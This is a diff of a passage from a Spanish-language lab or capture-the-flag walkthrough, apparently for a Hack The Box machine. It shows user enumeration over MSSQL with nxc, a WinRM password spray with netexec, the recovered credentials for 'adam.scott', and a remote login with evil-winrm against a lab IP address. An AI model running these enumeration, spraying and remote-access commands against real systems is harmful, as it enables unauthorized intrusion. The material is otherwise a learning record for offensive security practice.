@@ -83,7 +83,17 @@ Con estas credenciales podemos acceder al usuario admin de la pagina web usando 
 Enumeramos usuarios con 
 `nxc mssql 10.129.8.160 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute`
 
-Encontramos `adam.scott` y probamos 
+Encontramos una lista de usuarios y probamos a hacer fuerza bruta con la contraseña del usuario admin `netexec winrm -u users.tx -p iloveyou1`
+
+Comprobamos que tenemos credenciales validas en 
+```
+adam.scott::iloveyou1
+```
+
+
+Nos conectamos a la maquina con `evil-winrm -i 10.129.13.42 -u adam.scott -p iloveyou1`
+
+
 
 
 
